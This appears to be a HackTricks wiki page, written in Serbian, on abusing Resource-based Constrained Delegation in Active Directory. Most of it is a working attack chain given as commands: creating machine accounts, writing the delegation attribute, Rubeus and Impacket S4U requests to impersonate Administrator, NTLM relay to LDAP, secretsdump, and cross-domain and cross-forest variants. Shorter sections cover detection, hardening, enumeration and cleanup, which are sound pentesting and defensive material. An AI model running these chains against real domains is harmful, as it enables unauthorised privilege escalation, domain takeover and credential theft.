# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Osnove Resource-based Constrained Delegation

Ovo je slično osnovnom [Constrained Delegation](constrained-delegation.md), ali se **umesto** davanja dozvola **objektu** da **impersonate-uje bilo kog korisnika prema mašini**, kod Resource-based Constrain Delegation **podešava** u **objektu ko može da impersonate-uje bilo kog korisnika prema njemu**.<sup>[[12]](#references)</sup>

U ovom slučaju, ograničeni objekat će imati atribut pod nazivom _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ sa imenom korisnika koji može da impersonate-uje bilo kog drugog korisnika prema njemu.

Još jedna važna razlika između ovog Constrained Delegation i ostalih delegacija jeste to što bilo koji korisnik sa **write dozvolama nad machine account-om** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) može da podesi **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (kod drugih oblika Delegation bile su potrebne domain admin privilegije).<sup>[[1]](#references)</sup>

### Novi koncepti

Kod Constrained Delegation je ranije navedeno da je **`TrustedToAuthForDelegation`** flag unutar vrednosti _userAccountControl_ korisnika potreban za izvršavanje **S4U2Self.** Ali to nije potpuno tačno.\
U stvarnosti, čak i bez te vrednosti, možete izvršiti **S4U2Self** prema bilo kom korisniku ako ste **service** (imate SPN), ali ako **imate `TrustedToAuthForDelegation`**, vraćeni TGS će biti **Forwardable**, a ako nemate taj flag, vraćeni TGS neće biti **Forwardable**.

Međutim, ako **TGS** korišćen u **S4U2Proxy** nije **Forwardable**, pokušaj abuse-ovanja **basic Constrain Delegation** neće raditi. Ali ako pokušavate da exploit-ujete **Resource-Based constrain delegation**, radiće.<sup>[[1]](#references)[[2]](#references)</sup>

### Struktura napada

> Ako imate **write equivalent privileges** nad **Computer** account-om, možete dobiti **privileged access** na toj mašini.

Pretpostavimo da attacker već ima **write equivalent privileges nad victim computer-om**.

1. Attacker **compromises** account koji ima **SPN** ili **kreira jedan** („Service A“). Imajte na umu da bilo koji _Admin User_ bez drugih posebnih privilegija može da **kreira do 10 Computer objekata** (**_MachineAccountQuota_**) i da im postavi **SPN**. Zato attacker može jednostavno da kreira Computer objekat i postavi SPN.
2. Attacker **abuse-uje svoju WRITE privilegiju** nad victim computer-om (ServiceB) kako bi konfigurisao **resource-based constrained delegation tako da dozvoli ServiceA da impersonate-uje bilo kog korisnika** prema tom victim computer-u (ServiceB).
3. Attacker koristi Rubeus da izvrši **full S4U attack** (S4U2Self i S4U2Proxy) od Service A ka Service B za korisnika sa **privileged access** na Service B.
1. S4U2Self (sa kompromitovanog/kreiranog account-a sa SPN-om): Zahteva **TGS korisnika Administrator ka meni** (nije Forwardable).
2. S4U2Proxy: Koristi **TGS koji nije Forwardable** iz prethodnog koraka da zatraži **TGS** od korisnika **Administrator** ka **victim host-u**.
3. Čak i ako koristite TGS koji nije Forwardable, pošto exploit-ujete Resource-based constrained delegation, to će raditi.
4. Attacker može da uradi **pass-the-ticket** i **impersonate-uje** korisnika kako bi dobio **access to the victim ServiceB**.<sup>[[1]](#references)</sup>

Da biste proverili _**MachineAccountQuota**_ domena, možete koristiti:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Napad

### Kreiranje računarskog objekta

Možete kreirati računarski objekat u domenu pomoću **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurisanje delegiranja zasnovanog na resursima sa ograničenjem

**Korišćenje activedirectory PowerShell module-a**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Korišćenje powerview-a**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Izvođenje kompletnog S4U napada (Windows/Rubeus)

Pre svega, kreirali smo novi Computer objekat sa lozinkom `123456`, pa nam je potreban hash te lozinke:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Ovo će ispisati RC4 i AES hash vrednosti za taj nalog.\
Sada se napad može izvršiti:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Možete generisati više tiketa za više servisa samo jednim zahtevom koristeći parametar `/altservice` alata Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Imajte na umu da korisnici imaju atribut pod nazivom "**Cannot be delegated**". Ako je ovaj atribut kod korisnika postavljen na True, nećete moći da ga impersonirate. Ovo svojstvo se može videti unutar BloodHound-a.

### Linux alati: kompletan RBCD lanac pomoću Impacket-a (2024+)

Ako radite iz Linux-a, možete izvršiti ceo RBCD lanac pomoću zvaničnih Impacket alata:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Beleške
- Ako je LDAP signing/LDAPS nametnut, koristite `impacket-rbcd -use-ldaps ...`.
- Dajte prednost AES ključevima; mnogi moderni domeni ograničavaju RC4. Impacket i Rubeus podržavaju tokove koji koriste samo AES.
- Impacket može da prepiše `sname` ("AnySPN") za neke alate, ali kad god je moguće pribavite ispravan SPN (npr. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## Cross-domain & cross-forest RBCD

Ako se **delegating principal** kojim upravljate nalazi u **drugom domenu** (ili čak **drugoj šumi**) u odnosu na **resource computer**, zloupotreba je i dalje **RBCD**, ali tok ticket-a više nije uobičajeni `S4U2Self -> S4U2Proxy` za jedan domen.

### Cross-domain RBCD: konfigurisanje foreign principal-a pomoću SID-a

Kada podesite `msDS-AllowedToActOnBehalfOfOtherIdentity` iz **drugog domena**, strani machine/user možda **neće moći da se razreši po imenu** u LDAP-u ciljnog domena. U tom slučaju konfigurišite delegation entry koristeći **SID** stranog principal-a umesto njegovog sAMAccountName/UPN-a.

Ovo je naročito relevantno kada prosleđujete NTLM ka LDAP-u pomoću `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Napomene:
- `--sid` govori alatu `ntlmrelayx.py` da tretira `--escalate-user` kao SID, što je potrebno kada je delegirajući nalog iz druge domene od ciljne.
- Čak i ako alat ispiše `User not found in LDAP`, upis delegacije i dalje može uspeti, jer security descriptor direktno čuva strani SID.

### RBCD između domena: cross-realm S4U sekvenca

Kada se strani principal nalazi u `msDS-AllowedToActOnBehalfOfOtherIdentity`, funkcionalni tok između domena je:<sup>[[9]](#references)[[13]](#references)</sup>

1. Preuzmite **TGT** za delegirajući principal iz njegove domene.
2. Zatražite **referral TGT** za `krbtgt/<target-domain>`.
3. Zatražite **cross-realm S4U2Self referral** za impersoniranog korisnika na DC-u ciljne domene.
4. Zatražite stvarni **S4U2Self** ticket za tog korisnika u delegirajućoj domeni.
5. Izvršite **S4U2Proxy** u delegirajućoj domeni da biste dobili referral ticket za ciljnu domenu.
6. Izvršite završni **S4U2Proxy** na DC-u ciljne domene da biste dobili service ticket za `cifs/host.target`, `host/host.target` itd.

Zbog toga standardni Linux alati često ne uspevaju kod RBCD-a između domena:<sup>[[9]](#references)</sup>
- **realm** u zahtevu možda mora da se razlikuje od realm-a TGT-a korišćenog u `TGS-REQ`
- lanac zahteva nezavisne **S4U2Proxy** korake, a ne samo **S4U2Self** ili **S4U2Self** neposredno praćen jednim **S4U2Proxy**

### RBCD između domena iz Linux-a

Synacktiv je objavio Impacket implementaciju `getST.py` koja iz Linux-a reprodukuje cross-realm sekvencu eksplicitnim rukovanjem sa dva KDC-a:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operativno, novi argumenti su:
- `-dc-ip`: DC **delegirajućeg** domena
- `-targetdomain`: domen **resource računara**
- `-targetdc`: DC **resource** domena

### Ograničenja cross-forest RBCD

Cross-forest RBCD ima važno ograničenje: **impersonated user mora pripadati istom forestu kao delegating principal**. Drugim rečima, ako je vaš kontrolisani machine account u `valhalla.local`, a ciljni resource je u `asgard.local`, generalno **ne možete impersonate proizvoljne `asgard.local` korisnike** na tom resource-u putem RBCD.<sup>[[9]](#references)</sup>

I dalje je exploitable kada:
- je korisnik iz **delegating forest-a** **local admin** (ili na drugi način privilegovan) na resource hostu u drugom forestu
- trust dozvoljava potreban authentication path i strani SID je prihvaćen u security descriptor-u ciljnog računara

### Cross-forest RBCD protocol quirks

Cross-forest RBCD nije samo „cross-domain plus trust“. Uočeni flow obuhvata dve specifičnosti koje uobičajeni alati istorijski propuštaju:<sup>[[9]](#references)</sup>

1. Dodatni **S4U2Proxy** request koji postavlja **`PA-PAC-OPTIONS=branch-aware`**
2. Finalni service ticket koji može biti vraćen korišćenjem **RC4**, čak i kada su zatraženi drugi etype-ovi

Praktični flow je:

1. Dobijte TGT za delegating principal u forestu A.
2. Zatražite **S4U2Self** za impersonated user-a u forestu A.
3. Zatražite **S4U2Proxy** u forestu A da biste dobili referral TGT za forest B.
4. Pošaljite drugi **S4U2Proxy** u forestu A **bez S4U2Self ticket-a kao additional ticket-a**, ali sa omogućenim `branch-aware`, da biste dobili još jedan referral TGT za forest B.
5. Opciono zatražite normalan service ticket u forestu B za delegating principal (ovaj ticket nije potreban za finalnu zloupotrebu).
6. Iskoristite referral ticket-e iz koraka 3 i 4 da zatražite finalni **S4U2Proxy** ticket u forestu B za impersonated forest-A user-a prema ciljnom SPN-u.

### Cross-forest RBCD iz Linux-a

Isti Synacktiv Impacket branch dodaje `-forest` switch za ovu logiku:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Rekurzivni RBCD kroz više domena (3+ domena)

U **šumama sa više domena**, i **S4U2Self** i **S4U2Proxy** mogu biti **rekurzivni**, umesto da se zaustave nakon jednog upućivanja:

- **Rekurzivni S4U2Self**: prvi `S4U2Self` šalje se u **domen impersonifikovanog korisnika**, prelazi između posrednih roditeljskih/podređenih domena obavljaju se pomoću standardnih `TGS-REQ` upućivanja za `krbtgt/<REALM>`, a **poslednji `S4U2Self`** šalje se u **sopstveni domen delegirajućeg principal-a**.
- To znači da samo **posedovanje TGT-a** za machine account može biti dovoljno za impersonifikaciju **admina iz drugog domena u istoj šumi** i zahtevanje `cifs/host`, `host/host`, `wsman/host`, itd.
- **Rekurzivni S4U2Proxy** prati lanac poverenja na isti način: posredni skokovi ponovo koriste prethodni ticket kao TGT, dok zahtevaju sledeće `krbtgt/<REALM>` upućivanje, a samo poslednji skok vraća konačni service ticket.<sup>[[10]](#references)</sup>

Praktičan primer unutar iste šume je:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### RBCD bez SPN-a između domena / šuma

Ako je **delegirajući principal korisnik bez SPN-a**, poslednji rekurzivni `S4U2Self` neuspešno se završava greškom **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Rešenje je da se **ponovi samo završni korak kao `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Kratka verzija lanca zloupotrebe:

1. Autentifikujte se pomoću **NT hash-a** kako bi KDC bio usmeren ka **RC4-HMAC (etype 23)**.
2. Prvo zatražite **`-self -u2u`** i sačuvajte taj ticket odvojeno od kasnijeg proxy koraka.
3. Izvucite **TGT session key** pomoću `describeTicket.py`.
4. Zamenite korisnikov **NT hash** tim **session key-em** pomoću `changepasswd.py -newhashes <session_key>`.
5. Ponovo upotrebite `S4U2Self+U2U` ticket kao **`-additional-ticket`** tokom zasebnog zahteva **`-proxy`**.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Operativne napomene:

- Kada je **prvi trusted hop već druga forest**, preferirajte **branch-aware** algoritam (`getST.py ... -forest`) kako bi se podudaralo sa izvornim ponašanjem Windows sistema. Ako se do foreign forest dolazi tek kasnije u lancu, rekurzivni tok koji nije branch-aware i dalje može raditi.<sup>[[9]](#references)</sup>
- Na novijim **Windows Server 2022/2025** DC-ovima, forsirani RC4 može da ne uspe sa greškom **`KDC_ERR_ETYPE_NOSUPP`** zbog zastarevanja RC4-a; zbog toga **SPN-less RBCD** može biti nemoguć iako klasični RBCD zasnovan na SPN-u i dalje radi sa AES-om.<sup>[[15]](#references)</sup>
- Pokrenite **`S4U2Self+U2U` pre promene hash-a/lozinke korisnika**: `SamrChangePasswordUser` ne preračunava Kerberos AES ključeve naloga, pa promena lozinke pre toga može pokvariti kasnije zahteve za ticket-e.<sup>[[14]](#references)</sup>
- Impersonated nalog i dalje mora biti **delegable**: **Protected Users** i nalozi sa **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** blokiraju lanac.

## Napomene o detekciji / hardening-u

- RBCD putanje kroz domene/forest-ove i dalje se obično kreiraju zloupotrebom **ACL-ova** ili pomoću **relay-to-LDAP** tehnike. Uključite **LDAP signing** i **LDAP channel binding** na DC-ovima kako biste prekinuli uobičajene puteve za podešavanje.
- Proverite ko može da upisuje `msDS-AllowedToActOnBehalfOfOtherIdentity` na computer objektima i razrešite sačuvane SID-ove, uključujući **foreign security principals**.
- U okruženjima sa mnogo trust-ova proverite **Selective Authentication**, **SID filtering** i da li korisnici iz foreign forest-a imaju **local admin** privilegije na resource host-ovima.

### Pristupanje

Poslednja komandna linija će izvršiti **kompletan S4U napad i inject-ovati TGS** od Administrator naloga ka victim host-u u **memoriju**.\
U ovom primeru zatražen je TGS za **CIFS** servis od Administrator naloga, tako da ćete moći da pristupite **C$**:
```bash
ls \\victim.domain.local\C$
```
### Zloupotreba različitih service ticket-a

Saznajte više o [**dostupnim service ticket-ima ovde**](silver-ticket.md#available-services).

## Izlistavanje, auditing i čišćenje

### Izlistavanje računara sa konfigurisanom RBCD

PowerShell (dekodiranje SD-a radi razrešavanja SID-ova):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (read ili flush jednom komandom):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Čišćenje / resetovanje RBCD-a

- PowerShell (obrišite atribut):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos greške

- **`KDC_ERR_ETYPE_NOTSUPP`**: Ovo znači da je Kerberos konfigurisan tako da ne koristi DES ili RC4, a vi prosleđujete samo RC4 hash. Prosledite Rubeus-u najmanje AES256 hash (ili mu jednostavno prosledite RC4, AES128 i AES256 hash). Primer: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** tokom `-self` za običnog user-a: delegirajući principal verovatno **nema SPN**. Ponovite **poslednji hop** kao **`S4U2Self+U2U`** umesto standardnog **`S4U2Self`**.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** tokom **SPN-less RBCD**: noviji DC-ovi mogu odbiti forsirani **RC4-HMAC** path koji zahteva trik sa **`S4U2Self+U2U`** + zamenom session key-a. Umesto toga probajte klasični **SPN-backed** RBCD path sa AES-om.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Ovo znači da se vreme na trenutnom računaru razlikuje od vremena na DC-u i da Kerberos ne radi ispravno.
- **`preauth_failed`**: Ovo znači da dati username + hash-evi ne funkcionišu za login. Možda ste zaboravili da stavite znak "$" unutar username-a prilikom generisanja hash-eva (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Ovo može značiti:
- User kog pokušavate da impersonate-ujete ne može da pristupi željenom service-u (zato što ne možete da ga impersonate-ujete ili zato što nema dovoljno privilegija)
- Traženi service ne postoji (ako tražite ticket za WinRM, a WinRM nije pokrenut)
- Kreirani fakecomputer je izgubio privilegije nad ranjivim serverom i morate ponovo da mu ih dodelite.
- Abuse-ujete klasični KCD; imajte na umu da RBCD funkcioniše sa non-forwardable S4U2Self ticket-ima, dok KCD zahteva forwardable ticket-e.

## Beleške, relays i alternative

- RBCD SD možete upisati i preko AD Web Services (ADWS) ako je LDAP filtriran. Pogledajte:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay lanci često završavaju u RBCD-u kako bi se u jednom koraku postigao local SYSTEM. Pogledajte praktične end-to-end primere:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Ako su LDAP signing/channel binding **isključeni** i možete da kreirate machine account, alati kao što je **KrbRelayUp** mogu da relay-uju coerced Kerberos auth ka LDAP-u, podese `msDS-AllowedToActOnBehalfOfOtherIdentity` za vaš machine account na target computer objektu i odmah impersonate-uju **Administrator** putem S4U-a sa off-host sistema.<sup>[[8]](#references)</sup>

## Reference

- [1] [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [2] [Another Word on Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Resource-Based Constrained Delegation Abuse](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: An Offensive Kerberos Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Quick Linux cheatsheet with recent syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
